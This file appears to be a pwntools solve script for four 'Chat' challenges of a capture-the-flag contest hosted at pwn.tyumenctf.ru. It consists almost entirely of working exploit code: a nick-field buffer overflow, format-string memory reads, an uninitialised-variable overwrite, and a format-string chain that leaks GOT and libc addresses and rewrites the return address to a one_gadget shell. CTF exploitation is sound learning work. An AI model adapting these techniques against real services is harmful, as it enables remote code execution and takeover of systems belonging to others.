#!/usr/bin/python2.7
from pwn import *
import re



## Chat I
# buffer overflow in nick field
# It can be solved the following way:
# echo -e  '0w3x69TTf\nAAABBBCCCD\x01\n2' | nc pwn.tyumenctf.ru 2001
def flag0():
    r = remote("pwn.tyumenctf.ru", 2001)
    r.sendlineafter("token:", "xddPmceZI")
    r.sendlineafter("nick", "a"*10 + "\x01")
    r.sendlineafter(">> ", "2")
    print r.readlines(7)[-1]
    r.close()

## Chat II
# format string in chat
def flag1():
    r = remote("pwn.tyumenctf.ru", 2001)
    r.sendlineafter("token:", "fLi7gMFid")
    r.sendlineafter("nick", "nick")
    r.sendlineafter(">> ", "1")
    i = 82
    r.sendlineafter("nick: ", r"\%{}$s".format(i))
    print "%d: %s" % (i, r.readline())
    r.close()

## Chat III
# chat_id is not init. It can be overwritten with \n in chat with KISA
def flag2():
    r = remote("pwn.tyumenctf.ru", 2001)
    r.sendlineafter("token:", "fAMvYZkH4")
    r.sendlineafter("nick", "nick")
    r.sendlineafter(">> ", "1")
    r.sendlineafter("nick: ", "\\n")
    r.sendlineafter("KISA: ", "b"*255)
    r.sendlineafter("nick: ", "a"*128)
    r.sendlineafter("nick: ", "a"*128)
    print r.readline()

## Chat IV
# foramt string and rop or one_gadget :)
def flag3():
    r = remote("pwn.tyumenctf.ru", 2006)
    r.sendlineafter("token:", "fEJvvlwf1")
    r.sendlineafter("nick", "nick")
    fputs = 0x0006b990 # get from libc address _IO_puts func
    
    r.sendlineafter(">> ", "1")
    # Get GOT address
    r.sendlineafter("nick: ", r"\%9$p")
    addr = r.readline()
    addr = re.findall(r"(0x[0-9a-f]{12})", addr)[0]
    addr = int(addr, 16)
    addr_puts_got = addr + 0x3509 + 0x30   # Numbers got from debugger
    print "Addr got:", hex(addr_puts_got)

    # Get libc address
    p = r"\%15$s__" + p64(addr_puts_got)
    r.sendlineafter("nick: ", p)
    smth = r.recvline()
    put_addr = u64(smth[smth.index("\\") + 1:smth.index("_")] + "\x00\x00")
    libc_add = put_addr - fputs
    print "LibC: ", hex(libc_add)

    # Compute exec("/bin/sh") gadget address 
    exec_sh_addr = libc_add + 0x41320  # one_gadget to help ;)

    print "Exec_sh addr:", hex(exec_sh_addr)

    # Get return address location from chat with KISA
    r.sendlineafter("nick: ", "\%32$p")
    addr = r.readline()
    addr = re.findall(r"(0x[0-9a-f]{12})", addr)[0]
    addr = int(addr, 16) - 0x28     # Number got from debugger

    # Change return address
    # This can be wrong sometimes :(
    for i in range(0, 6):
        val = (((exec_sh_addr & (0xff << i*8)) >> i*8) & 0xff)
        if val-0x11 <= 0:
            val = val + 0x100 - 0x11
        else:
            val -= 0x11
        n = r"\%{:3}x%16$hn____".format(val) + p64(addr + i)
        r.sendlineafter("nick: ", n)
        smth = r.recvline()

    r.sendlineafter("nick: ", "\%33$p")
    smth = r.recvline()
    smth = re.findall(r"(0x[0-9a-f]{12})", smth)[0]
    print "Return addr: ", smth

    # exit the chat with KISA
    r.sendlineafter("nick: ", "\q")
    print r.readall()
    r.close()

if __name__ == "__main__":
    flag0()
    flag1()
    flag2()
    flag3()
